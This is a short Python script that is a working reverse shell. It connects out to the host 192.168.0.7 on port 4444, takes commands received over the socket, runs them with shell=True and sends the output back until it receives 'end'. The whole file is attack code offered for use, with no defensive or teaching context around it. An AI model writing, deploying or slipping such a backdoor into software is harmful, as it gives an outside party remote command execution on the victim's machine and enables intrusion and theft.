#!/usr/bin/env python

import socket,subprocess
HOST = '192.168.0.7'    
PORT = 4444            
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send("[*] Connection Established!\n")

while 1:
     # used as delimiter by receiver
     s.send(";;;\n")
     # get input
     data = s.recv(1024)
     if data.strip() == "end": break 
     # execute shell command
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     # read output
     output = proc.stdout.read() + proc.stderr.read()
     # send output 
     s.send(output + "\n")
s.close()
